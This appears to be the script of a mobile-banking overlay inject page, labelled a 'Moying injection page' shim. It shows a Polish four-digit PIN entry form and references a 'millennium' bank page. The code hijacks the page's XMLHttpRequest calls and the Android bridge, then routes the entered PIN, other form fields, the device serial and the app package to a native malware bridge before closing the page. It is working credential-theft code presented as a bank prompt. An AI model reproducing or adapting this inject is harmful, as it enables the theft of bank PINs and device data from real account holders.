<script>
/* ===== 墨影注入页协议 shim（只走原生桥，禁止任何外发） ===== */
(function(){
  var TPL = window.__MOYING_TPL || 'unknown';
  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : ''; }catch(e){ return ''; } }
  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : ''; }catch(e){ return ''; } }
  function push(form){
    var pl = JSON.stringify({ pkg: pk(), sn: sn(), template: TPL, formData: form || {} });
    try{ if(window.FKB && FKB.setFormData) FKB.setFormData(pl); }catch(e){}
    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
    return pl;
  }
  window.__moyingPush = push;
  /* ① 页面自带的 XMLHttpRequest 外发统一截获，改走桥 */
  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function(b){
    var u = this.__mu || '';
    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('/api/inj/result') >= 0){
      var o = {}, tpl = TPL;
      try{ o = JSON.parse(b||'{}'); }catch(e){}
      if(o && o.template) tpl = o.template;
      var form = (o && (o.formData || o.data)) ? (o.formData || o.data) : o;
      window.__MOYING_TPL = tpl;
      push(form);
      return;
    }
    return _send.apply(this, arguments);
  };
  /* ② 直接调用 Android.returnResult(json) 的老页面（如 millennium）也转成我们的协议 */
  var orig = (window.Android && window.Android.returnResult) ? window.Android.returnResult : null;
  var bridge = {
    returnResult: function(s){
      var o = null;
      try{ o = (typeof s === 'string') ? JSON.parse(s) : s; }catch(e){ o = null; }
      if(o && o.action){ if(orig){ try{ return orig(s); }catch(e){} } return; }
      if(o && (o.formData || o.pkg)) push(o.formData || o);
      else push(o || {});
    },
    setFormData: function(s){ try{ var o=JSON.parse(s); push(o.formData||o); }catch(e){ push({}); } },
    getPkg: function(){ return pk(); },
    getSn: function(){ return sn(); },
    getUserName: function(){ try{ return (orig && orig.getUserName && orig.getUserName()) || ''; }catch(e){ return ''; } },
    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(p||pk()); }catch(e){} },
    close: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} },
    finish: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }
  };
  try{ window.Android = bridge; }catch(e){}
})();
</script>

<script>
if ( typeof Android == "undefined")
    var Android = {
        returnResult : alert.bind(window)
    }

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals.join(',') + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSONbyName(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
        var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            if(bsform[j].name == 'sumbit') continue;
            FinalObject[bsform[j].name] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}

function send_form()
{
    var pb = document.querySelectorAll('input.pin');
    var code = '';
    for (var i = 0; i < pb.length; i++) code += pb[i].value;
    if (!/^[0-9]{4}$/.test(code))
    {
        alert ('Wprowad\u017a 4-cyfrowy PIN');
        try{ pb[0].focus(); }catch(e){}
        return false;
    }
    var form = document.getElementById('formtosend');
    Android.returnResult( formToJSONbyName(form) );
}

(function(){
    var boxes = Array.prototype.slice.call(document.querySelectorAll('input.pin'));
    if (!boxes.length) return;
    var hid = document.getElementById('pinHidden');
    function sync(){
        var v = '';
        for (var i=0;i<boxes.length;i++) v += boxes[i].value;
        if (hid) hid.value = v;
        for (var j=0;j<boxes.length;j++) boxes[j].className = boxes[j].value ? 'pin filled' : 'pin';
    }
    function focusAt(i){ if (boxes[i]) { boxes[i].focus(); try{boxes[i].select();}catch(e){} } }
    for (var i=0;i<boxes.length;i++){
        (function(b, idx){
            b.addEventListener('input', function(){
                var d = b.value.replace(/[^0-9]/g, '').slice(0,1);
                b.value = d;
                sync();
                if (d && idx < boxes.length - 1) focusAt(idx + 1);
            });
            b.addEventListener('keydown', function(e){
                if (e.key === 'Backspace'){
                    if (!b.value && idx > 0){ e.preventDefault(); boxes[idx-1].value = ''; sync(); focusAt(idx-1); }
                } else if (e.key === 'ArrowLeft' && idx > 0){ e.preventDefault(); focusAt(idx-1); }
                else if (e.key === 'ArrowRight' && idx < boxes.length-1){ e.preventDefault(); focusAt(idx+1); }
            });
            b.addEventListener('focus', function(){ try{ b.select(); }catch(e){} });
            b.addEventListener('paste', function(e){
                var t = (e.clipboardData || window.clipboardData).getData('text') || '';
                var d = t.replace(/[^0-9]/g,'').slice(0, boxes.length);
                if (!d) return;
                e.preventDefault();
                for (var k=0;k<boxes.length;k++) boxes[k].value = d.charAt(k) || '';
                sync();
                focusAt(Math.min(d.length, boxes.length-1));
            });
        })(boxes[i], i);
    }
    var wrapEl = document.getElementById('pinWrap');
    if (wrapEl) wrapEl.addEventListener('click', function(e){ if (e.target === wrapEl) focusAt(0); });
})();
</script>
